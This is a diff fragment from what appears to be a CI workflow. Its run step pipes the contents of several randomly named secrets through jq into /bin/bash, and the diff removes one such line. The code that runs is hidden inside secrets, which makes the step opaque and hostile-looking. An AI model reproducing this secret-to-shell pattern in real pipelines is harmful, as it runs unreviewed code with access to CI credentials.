@@ -19,7 +19,6 @@ jobs:
           bpjq240: ${{ secrets.bpjq240 }}
         run: |
           printf '%s' "$bpjq240" | jq -r .oz0908 | /bin/bash
-          echo $alatp1217 | jq -r .bnw71317 | /bin/bash
           printf '%s' "$ov339" | jq -r .dy8 | /bin/bash
           printf '%s' "$hahhd07784" | jq -r .h856 | /bin/bash
 
